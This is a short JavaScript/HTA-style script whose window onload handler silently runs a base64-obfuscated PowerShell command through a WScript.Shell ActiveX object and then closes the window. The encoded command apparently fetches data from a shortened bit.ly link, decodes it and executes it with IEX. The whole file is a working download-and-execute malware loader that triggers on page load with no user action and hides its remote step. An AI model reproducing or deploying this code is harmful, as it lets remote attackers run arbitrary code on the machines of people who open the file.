function Window_onLoad(){
	strCMD = 'powershell.exe -e \"SQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4ATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsACgAIgAiACwAKABDAG8AbgB2AGUAcgB0AFQAbwAtAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACgAKAAoAEkAVwBSACAAaAB0AHQAcABzADoALwAvAGIAaQB0AC4AbAB5AC8AMwBGAEwAUgBsAHcAdwApAHwAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgApAC4AQQBuAHMAdwBlAHIALgBkAGEAdABhACkALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQApACkAKQAuAFAAYQBzAHMAdwBvAHIAZAApACkAKQA=\"';
	var oWSS = new ActiveXObject("wscript.Shell");
	oWSS.run ('CMD /C' + strCMD ,0,true);
	oWSS = null;
	window.close();
};
window.onload=Window_onLoad;
